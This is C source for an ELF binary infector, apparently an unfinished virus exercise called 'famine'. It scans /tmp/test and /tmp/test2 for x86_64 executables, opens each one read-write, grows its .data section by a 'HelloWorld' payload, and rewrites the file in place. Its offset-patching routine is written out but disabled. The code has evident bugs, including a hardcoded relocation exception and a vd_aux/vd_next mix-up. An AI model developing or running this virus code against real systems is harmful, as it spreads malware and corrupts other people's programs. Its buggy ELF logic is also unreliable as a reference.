#include "famine.h"

const char *payload = "HelloWorld";

static void updateOffsets(Elf64_Ehdr *header, size_t offset, size_t toAdd) {
    size_t      i;
    size_t      size;
    Elf64_Shdr  *section;
    Elf64_Phdr  *program;

    if (header->e_entry >= offset)
      header->e_entry += toAdd;
    if (header->e_phoff >= offset)
      header->e_phoff += toAdd;
    if (header->e_shoff >= offset)
      header->e_shoff += toAdd;
    i = 0;
    while (i < header->e_shnum) {
        section = (void *)(header) + header->e_shoff + i * sizeof(Elf64_Shdr);
        if (section->sh_offset >= offset)
            section->sh_offset += toAdd;
        if (section->sh_addr >= offset)
            section->sh_addr += toAdd;
        if (section->sh_type == SHT_REL) {
            Elf64_Rel *rel;
            size = 0;
            while (size < section->sh_size) {
              rel = ((void *)header) + section->sh_offset + (sizeof(Elf64_Rel) * (size / sizeof(Elf64_Rel)));
              if (rel->r_offset >= offset)
                rel->r_offset += toAdd;
              size += sizeof(Elf64_Rel);
            }
        } else if (section->sh_type == SHT_RELA) {
            Elf64_Rela  *rela;
            size = 0;
            while (size < section->sh_size) {
              rela = ((void *)header) + section->sh_offset + (sizeof(Elf64_Rela) * (size / sizeof(Elf64_Rela)));
              if (rela->r_offset > offset) {
                // TODO Remove this
                if (!(rela->r_offset == 0x4fe0 && toAdd == 8)) {
                  rela->r_offset += toAdd;
                }
              }
              size += sizeof(Elf64_Rela);
            }
        } else if (section->sh_type == SHT_DYNAMIC) {
            Elf64_Dyn *dyn;
            size = 0;
            while (size < section->sh_size) {
              dyn = ((void *)header) + section->sh_offset + (sizeof(Elf64_Dyn) * (size / sizeof(Elf64_Dyn)));
              if (dyn->d_un.d_ptr >= offset)
                dyn->d_un.d_ptr += toAdd;
              size += sizeof(Elf64_Dyn);
            }
        } else if (section->sh_type == SHT_GNU_verdef) {
            Elf64_Verdef  *verdef;
            verdef = ((void *)header) + section->sh_offset;
            if (section->sh_offset < offset && verdef->vd_aux >= offset)
              verdef->vd_aux += toAdd;
            if (section->sh_offset < offset && verdef->vd_next >= offset)
              verdef->vd_aux += toAdd;
        } else if (section->sh_type == SHT_SYMTAB) {
          Elf64_Xword size;
          Elf64_Sym   *symbol;
          size = 0;
          while (size < section->sh_size) {
            symbol = ((void *)header) + section->sh_offset + size;
            if (symbol->st_value >= offset) {
              symbol->st_value += toAdd;
            }
            size += sizeof(Elf64_Sym);
          }
        }
        i += 1;
    }
    i = 0;
    while (i < header->e_phnum) {
        program = ((void *)header) + header->e_phoff + i * sizeof(Elf64_Phdr);
        if (program->p_offset >= offset)
            program->p_offset += toAdd;
        if (program->p_vaddr >= offset)
            program->p_vaddr += toAdd;
        if (program->p_paddr >= offset)
            program->p_paddr += toAdd;
        i += 1;
    }
}

static int  mapFile(const char *dirname, const char *filename, struct bfile *file) {
  int         fd;
  char        *tmp;
  struct stat stats;

  if ((tmp = malloc(strlen(dirname) + strlen(filename) + 2)) == NULL)
    return (-1);
  strcpy(tmp, dirname);
  strcat(tmp, "/");
  strcat(tmp, filename);
  if ((fd = open(tmp, O_RDWR)) == -1) {
    free(tmp);
    return (-1);
  }
  free(tmp);
  if (fstat(fd, &stats) == -1) {
    close(fd);
    return (-1);
  }
  file->size = stats.st_size;
  if ((file->header = mmap(NULL, file->size + strlen(payload) + 1, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED) {
    close(fd);
    return (-1);
  }
  close(fd);
  return (0);
}

static int  isCompatible(unsigned char e_ident[EI_NIDENT], Elf64_Half e_machine) {
  return (e_ident[EI_MAG0] == ELFMAG0 &&
          e_ident[EI_MAG1] == ELFMAG1 &&
          e_ident[EI_MAG2] == ELFMAG2 &&
          e_ident[EI_MAG3] == ELFMAG3 &&
          e_machine == EM_X86_64);
}

static Elf64_Shdr *getDataSectionHeader(Elf64_Ehdr *header) {
  Elf64_Shdr  *pointer;
  Elf64_Shdr  *shstrHeader;

  pointer = ((void *)header) + header->e_shoff;
  shstrHeader = ((void *)header) + header->e_shoff + sizeof(Elf64_Shdr) * header->e_shstrndx;
  while (strcmp(((void *)header) + shstrHeader->sh_offset + pointer->sh_name, ".data") != 0)
    pointer += 1;
  return (pointer);
}

static int  writeToFile(const char *dirname, const char *filename, struct bfile header) {
  int   fd;
  char  *tmp;

  if ((tmp = malloc(strlen(dirname) + strlen(filename) + 2)) == NULL)
    return (-1);
  strcpy(tmp, dirname);
  strcat(tmp, "/");
  strcat(tmp, filename);
  if ((fd = open(tmp, O_WRONLY)) == -1) {
    free(tmp);
    return (-1);
  }
  free(tmp);
  write(fd, header.header, header.size);
  close(fd);
  return (0);
}

static int  infectFile(const char *dirname, struct dirent *file) {
  Elf64_Shdr    *data;
  struct bfile  header;

  if (mapFile(dirname, file->d_name, &header) == -1)
    return (0);
  if (!isCompatible(header.header->e_ident, header.header->e_machine))
    return (0);
  dprintf(1, "File %s is compatible\n", file->d_name);
  data = getDataSectionHeader(header.header);
  data->sh_size += strlen(payload);
  (void)updateOffsets;
  /* updateOffsets(header.header, data->sh_offset, strlen(payload)); */
  writeToFile(dirname, file->d_name, header);
  return (0);
}

static int  infectBins(const char *dirname) {
  DIR *dir;
  struct dirent *file;

  if ((dir = opendir(dirname)) == NULL)
    return (-1);
  while ((file = readdir(dir)) != NULL) {
    if (infectFile(dirname, file) == -1) {
      closedir(dir);
      return (-1);
    }
  }
  closedir(dir);
  return (0);
}

int   main(void) {
  size_t  i;
  char    *infectDir[3] = {"/tmp/test", "/tmp/test2", NULL};

  i = 0;
  while (infectDir[i] != NULL) {
    if (infectBins(infectDir[i]) == -1)
      return (1);
    i += 1;
  }
  return (0);
}
